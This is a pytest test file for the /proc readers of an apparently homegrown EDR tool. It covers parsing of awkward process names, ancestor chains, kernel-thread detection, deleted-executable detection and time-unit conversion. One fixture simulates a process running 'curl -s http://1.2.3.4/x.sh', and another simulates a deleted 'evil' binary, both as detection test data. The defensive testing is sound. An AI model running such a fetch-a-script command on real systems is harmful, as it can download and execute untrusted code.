"""Tests for the /proc readers.

Most of these attack the parsing of `comm`, because that is where a bug goes
unnoticed: a misread starttime produces no error at all, only a wrong security
decision later on.
"""

import os

import pytest

from edr import procinfo


# ── parsing pathological comm values ───────────────────────────
# The first three are not hypothetical: they exist on the development machine
# (WSL2/Debian 13). The last two are the edge cases that break a naive parse
# based on split() or on finding the first parenthesis.
@pytest.mark.parametrize("comm", [
    "(sd-pam)",           # the whole comm is parenthesised
    "Relay(203)",         # parenthesis in the middle
    "init-systemd(De",    # unclosed parenthesis, truncated to 15 chars
    ") (",                # the classic pathological case
    "process with spaces",
])
def test_parsing_a_pathological_comm(fake_proc, comm):
    fake_proc(pid=42, comm=comm, ppid=7, starttime=98765)
    stat = procinfo.read_stat(42)

    assert stat is not None, f"could not parse comm={comm!r}"
    assert stat["comm"] == comm
    # What actually matters: the later fields have not shifted.
    assert stat["ppid"] == 7
    assert stat["starttime"] == 98765


def test_starttime_is_right_with_a_comm_containing_parentheses(fake_proc):
    """A naive split() would return the wrong field without raising anything."""
    fake_proc(pid=99, comm="a) (b", ppid=3, starttime=555555)
    assert procinfo.starttime(99) == 555555
    assert procinfo.proc_key(99) == "99:555555"


# ── nonexistent process ────────────────────────────────────────

def test_a_nonexistent_process_returns_none():
    pid = 999999
    assert procinfo.read_stat(pid) is None
    assert procinfo.starttime(pid) is None
    assert procinfo.comm(pid) is None
    assert procinfo.proc_key(pid) is None
    assert procinfo.snapshot(pid) is None
    assert procinfo.ancestors(pid) == []


def test_a_truncated_stat_returns_none(fake_proc, tmp_path):
    (tmp_path / "50").mkdir()
    (tmp_path / "50" / "stat").write_text("50 (short) S 1 0 0\n")
    assert procinfo.read_stat(50) is None


def test_a_stat_without_parentheses_returns_none(tmp_path, monkeypatch):
    monkeypatch.setattr(procinfo, "PROC", str(tmp_path))
    (tmp_path / "51").mkdir()
    (tmp_path / "51" / "stat").write_text("51 junk without parens\n")
    assert procinfo.read_stat(51) is None


# ── a real process ─────────────────────────────────────────────

def test_a_real_process(live_process):
    pid = live_process.pid
    stat = procinfo.read_stat(pid)

    assert stat is not None
    assert stat["comm"] == "sleep"
    assert stat["ppid"] == os.getpid()
    assert stat["starttime"] > 0
    assert not procinfo.is_kernel_thread(pid)


def test_starttime_is_stable(live_process):
    """Identity cannot change between reads: that is the whole premise."""
    pid = live_process.pid
    assert procinfo.starttime(pid) == procinfo.starttime(pid)


def test_is_alive_compares_identity(live_process):
    pid = live_process.pid
    st = procinfo.starttime(pid)

    assert procinfo.is_alive(pid, st)
    assert not procinfo.is_alive(pid, st + 1)
    # With no captured identity nothing can be asserted: when in doubt, do not act.
    assert not procinfo.is_alive(pid, None)


def test_snapshot_of_a_real_process(live_process):
    snap = procinfo.snapshot(live_process.pid)

    assert snap["comm"] == "sleep"
    assert snap["exe"] is not None
    assert snap["exe_deleted"] is False
    assert "sleep" in snap["cmdline"]
    assert snap["uid"] == os.getuid()
    assert snap["proc_key"] == f"{live_process.pid}:{snap['starttime']}"


# ── kernel threads ─────────────────────────────────────────────
# WSL2 exposes no kernel threads in /proc, so this case can only be covered with
# a synthetic tree. The phase 7 lab VM will have a real kthreadd.

def test_a_kernel_thread_is_detected(fake_proc):
    fake_proc(pid=2, comm="kthreadd", kthread=True)
    assert procinfo.is_kernel_thread(2)


def test_an_ordinary_process_is_not_a_kernel_thread(fake_proc):
    fake_proc(pid=300, comm="bash", kthread=False)
    assert not procinfo.is_kernel_thread(300)


# ── ancestor chain ─────────────────────────────────────────────

def test_the_ancestor_chain(fake_proc):
    fake_proc(pid=1, comm="systemd", ppid=0)
    fake_proc(pid=10, comm="sshd", ppid=1)
    fake_proc(pid=20, comm="bash", ppid=10)
    fake_proc(pid=30, comm="curl", ppid=20)

    assert procinfo.ancestors(30) == [20, 10, 1]


def test_a_cycle_in_the_ancestry_does_not_hang(fake_proc):
    """/proc should not contain cycles, but hanging the EDR would be worse."""
    fake_proc(pid=60, comm="a", ppid=61)
    fake_proc(pid=61, comm="b", ppid=60)

    chain = procinfo.ancestors(60)
    assert len(chain) < procinfo._MAX_ANCESTRY_DEPTH


def test_the_ancestry_of_a_real_process_ends_at_1():
    chain = procinfo.ancestors(os.getpid())
    assert chain[-1] == 1
    assert os.getppid() == chain[0]


# ── deleted executable ─────────────────────────────────────────

def test_a_deleted_executable_is_detected(fake_proc, tmp_path, monkeypatch):
    """A cheap signal, and a very common one in modern malware."""
    fake_proc(pid=70, comm="evil", starttime=1)
    monkeypatch.setattr(
        procinfo.os, "readlink",
        lambda path: "/tmp/evil (deleted)" if path.endswith("/exe") else "/tmp",
    )
    snap = procinfo.snapshot(70)
    assert snap["exe_deleted"] is True


# ── cmdline ────────────────────────────────────────────────────

def test_cmdline_splits_on_nulls(fake_proc):
    fake_proc(pid=80, comm="curl", cmdline=["curl", "-s", "http://1.2.3.4/x.sh"])
    assert procinfo.cmdline(80) == "curl -s http://1.2.3.4/x.sh"


def test_an_empty_cmdline_from_a_kernel_thread(fake_proc):
    fake_proc(pid=81, comm="kworker", kthread=True, cmdline=[])
    assert procinfo.cmdline(81) == ""


# ── unit conversion between the probe and /proc ────────────────
# The eBPF probe reads `task->start_boottime` in nanoseconds; /proc exposes the
# same instant in clock ticks. If the conversion were not exact, the pid_reused
# check would always fail and nothing could ever be remediated.

def test_ns_to_ticks():
    assert procinfo.ns_to_ticks(15_083_530_000_000) == 1_508_353
    assert procinfo.ns_to_ticks(0) == 0
    assert procinfo.ns_to_ticks(None) is None


def test_ns_to_ticks_truncates_like_the_kernel():
    """`nsec_to_clock_t` is an integer division: it truncates, it does not round."""
    tick = procinfo.NS_PER_TICK
    assert procinfo.ns_to_ticks(tick - 1) == 0
    assert procinfo.ns_to_ticks(tick) == 1
    assert procinfo.ns_to_ticks(tick * 2 - 1) == 1


def test_the_conversion_matches_proc(live_process):
    """The check that really matters, against a real process.

    The nanoseconds are rebuilt from the ticks /proc gives and converted back:
    the round trip has to close exactly.
    """
    ticks = procinfo.starttime(live_process.pid)
    assert procinfo.ns_to_ticks(ticks * procinfo.NS_PER_TICK) == ticks
